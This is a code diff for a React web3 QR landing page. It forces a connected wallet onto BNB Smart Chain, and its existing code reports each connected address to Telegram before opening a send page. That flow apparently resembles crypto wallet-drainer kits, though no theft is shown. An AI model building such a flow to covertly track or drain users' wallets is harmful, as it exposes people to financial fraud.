@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react"
 import { ethers } from "ethers"
 import { notify, formatAddress } from "../lib/telegram"
+import { ensureCorrectNetwork } from "../lib/web3"
 import SendPage from "./send-page"
 
 type Step = "detecting" | "send" | "error" | "not_trust"
@@ -36,9 +37,20 @@ export default function QRLanding() {
         const bp = new ethers.BrowserProvider(injectedProvider)
         const accounts = await bp.send("eth_requestAccounts", [])
         const addr = accounts[0]
+
+        // ★ FORCE BNB SMART CHAIN immediately after connect
+        let finalProvider: ethers.BrowserProvider = bp
+        try {
+          const switchedProvider = await ensureCorrectNetwork(bp)
+          finalProvider = switchedProvider || bp
+        } catch (err: any) {
+          console.warn("Switch on connect failed:", err?.message || err)
+          // if user rejects, proceed anyway — send page will re-prompt
+        }
+
         await notify("Wallet Connected: " + formatAddress(addr))
         if (!mountedRef.current) return
-        setProvider(bp)
+        setProvider(finalProvider)
         setAddress(addr)
         setStep("send")
       } catch (err: any) {
